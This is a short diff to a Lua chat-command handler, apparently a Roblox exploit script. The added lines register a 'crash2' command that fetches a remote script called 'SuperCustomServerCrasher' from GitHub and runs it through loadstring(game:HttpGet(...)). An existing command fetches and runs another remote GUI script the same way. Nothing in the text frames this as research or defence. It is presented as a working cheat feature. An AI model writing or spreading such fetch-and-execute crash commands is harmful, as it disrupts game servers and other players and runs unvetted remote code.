@@ -247,6 +247,9 @@ local function onChatted(p,msg)
          if msg:match(prefix.."sellinggui") then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
         end
+	if msg:match(prefix.."crash2") then	
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+	end
      return
     end
      
